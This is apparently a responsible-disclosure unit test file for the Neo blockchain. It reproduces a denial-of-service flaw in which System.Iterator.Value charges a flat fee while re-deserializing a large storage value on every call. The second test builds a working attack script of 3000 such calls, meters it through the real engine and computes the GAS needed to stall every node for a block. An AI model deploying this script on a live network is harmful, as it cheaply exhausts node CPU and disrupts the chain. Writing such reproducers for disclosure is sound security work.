// Copyright (C) 2015-2025 The Neo Project.
//
// WHITEHAT SECURITY REPRODUCER — read-only demonstration for responsible disclosure.
// System.Iterator.Value (fixed price 1<<4 = 16 datoshi, ApplicationEngine.Iterator.cs:29) re-runs a
// FULL BinarySerializer.Deserialize of the (attacker-controlled, up to 64KB) storage value on EVERY
// call under FindOptions.DeserializeValues (StorageIterator.cs:51-52), with no caching and — under
// PickField0 — discarding the result so the VM reference counter never charges for it. The charged
// fee is independent of the work performed.

using System;
using System.Collections.Generic;
using System.Diagnostics;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using Neo.SmartContract;
using Neo.SmartContract.Iterators;
using Neo.SmartContract.Native;
using Neo.VM;
using Neo.VM.Types;
using VMArray = Neo.VM.Types.Array;

namespace Neo.UnitTests.SmartContract
{
    [TestClass]
    public class UT_IteratorValueDoS
    {
        private static byte[] SerializedIntArray(int count)
        {
            var arr = new VMArray();
            for (int i = 0; i < count; i++) arr.Add(i);
            return BinarySerializer.Serialize(arr, ExecutionEngineLimits.Default);
        }

        private static byte[] SerializedMaxPayload()
        {
            var arr = new VMArray();
            for (int i = 0; i < 2047; i++) arr.Add(new byte[28]);
            var bytes = BinarySerializer.Serialize(arr, ExecutionEngineLimits.Default);
            Assert.IsTrue(bytes.Length <= ApplicationEngine.MaxStorageValueSize);
            return bytes;
        }

        private static StorageIterator MakeIterator(byte[] serializedValue, FindOptions options)
        {
            var key = new StorageKey { Id = 1, Key = new byte[] { 1 } };
            var item = new StorageItem(serializedValue);
            var seq = new List<(StorageKey, StorageItem)> { (key, item) };
            var it = new StorageIterator(seq.GetEnumerator(), 0, options);
            it.Next();
            return it;
        }

        private static double TimeCalls(byte[] payload, FindOptions options, int n)
        {
            var it = MakeIterator(payload, options);
            var sw = Stopwatch.StartNew();
            for (int i = 0; i < n; i++) _ = it.Value();
            sw.Stop();
            return sw.Elapsed.TotalMilliseconds;
        }

        [TestMethod]
        public void IteratorValue_FlatPriced_ReDeserializesFullPayloadEveryCall()
        {
            Assert.AreEqual(1 << 4, (int)ApplicationEngine.System_Iterator_Value.FixedPrice);
            var options = FindOptions.DeserializeValues | FindOptions.PickField0 | FindOptions.ValuesOnly;
            var small = SerializedIntArray(1);
            var large = SerializedIntArray(2047);
            const int N = 20000;

            var w = MakeIterator(large, options); for (int i = 0; i < 200; i++) _ = w.Value();
            var tSmall = TimeCalls(small, options, N);
            var tLarge = TimeCalls(large, options, N);

            Console.WriteLine($"payload bytes: small={small.Length}, large={large.Length}");
            Console.WriteLine($"N={N}, CONSTANT fee {ApplicationEngine.System_Iterator_Value.FixedPrice} datoshi/call:");
            Console.WriteLine($"  small(1)    : {tSmall / N * 1000,7:F2} us/call");
            Console.WriteLine($"  large(2047) : {tLarge / N * 1000,7:F2} us/call -> {tLarge / tSmall:F1}x for SAME fee");
            Assert.IsTrue(tLarge > tSmall * 5);
        }

        // ON-CHAIN EXECUTION: drive the attack through the real ApplicationEngine + gas metering
        // (the exact code path Blockchain.Persist runs per transaction), and measure the actual
        // FeeConsumed (on-chain gas charged) vs. the node CPU it forces.
        [TestMethod]
        public void IteratorValue_OnChainExecution_TrivialFeeMassiveCpu()
        {
            var snapshot = TestBlockchain.GetTestSnapshotCache();
            const int contractId = 0x4243;
            var prefix = new byte[] { (byte)'K' };
            // Seed ONE storage entry (~61KB serialized array) under (contractId, prefix).
            snapshot.Add(new StorageKey { Id = contractId, Key = prefix }, new StorageItem(SerializedMaxPayload()));

            var options = FindOptions.DeserializeValues | FindOptions.PickField0 | FindOptions.ValuesOnly;
            const int N = 3000;

            using var sb = new ScriptBuilder();
            sb.EmitSysCall(ApplicationEngine.System_Storage_Find);   // (context, prefix, options) -> iterator
            sb.Emit(OpCode.DUP);
            sb.EmitSysCall(ApplicationEngine.System_Iterator_Next);  // advance to the single element
            sb.Emit(OpCode.DROP);
            for (int i = 0; i < N; i++)
            {
                sb.Emit(OpCode.DUP);
                sb.EmitSysCall(ApplicationEngine.System_Iterator_Value); // full re-deserialize, flat 16 fee
                sb.Emit(OpCode.DROP);
            }
            sb.Emit(OpCode.DROP);

            using var engine = ApplicationEngine.Create(TriggerType.Application, null, snapshot,
                settings: TestProtocolSettings.Default, gas: 1000_00000000L);
            engine.LoadScript(sb.ToArray(), configureState: state => state.CallFlags = CallFlags.ReadStates);
            engine.Push((int)options);
            engine.Push(prefix);
            engine.Push(new InteropInterface(new StorageContext { Id = contractId, IsReadOnly = true }));

            var sw = Stopwatch.StartNew();
            var vmstate = engine.Execute();
            sw.Stop();

            if (vmstate != VMState.HALT && engine.FaultException != null)
                Console.WriteLine("Fault: " + engine.FaultException);
            Assert.AreEqual(VMState.HALT, vmstate);

            long feeDatoshi = engine.FeeConsumed;
            double feeGas = feeDatoshi / 1e8;
            double ms = sw.Elapsed.TotalMilliseconds;
            double cpuSecPerGas = (ms / 1000.0) / feeGas;
            double gasToStall15s = 15.0 / (ms / 1000.0) * feeGas;

            Console.WriteLine($"ON-CHAIN execution of {N} System.Iterator.Value calls (real engine + metering):");
            Console.WriteLine($"  FeeConsumed (on-chain gas charged) = {feeDatoshi} datoshi = {feeGas:F6} GAS");
            Console.WriteLine($"  node CPU spent                     = {ms:F1} ms ({ms / N * 1000:F1} us/call)");
            Console.WriteLine($"  => node CPU forced per 1 GAS       = {cpuSecPerGas:F1} seconds");
            Console.WriteLine($"  => GAS to force one 15s block of CPU on EVERY node = {gasToStall15s:F3} GAS");

            Assert.IsTrue(feeGas < 0.05, $"on-chain fee should be trivial (was {feeGas:F6} GAS)");
            Assert.IsTrue(ms > 100, $"node CPU should be large (was {ms:F1} ms)");
            Assert.IsTrue(cpuSecPerGas > 5, $"amplification must be severe (was {cpuSecPerGas:F1} CPU-s/GAS)");
        }
    }
}
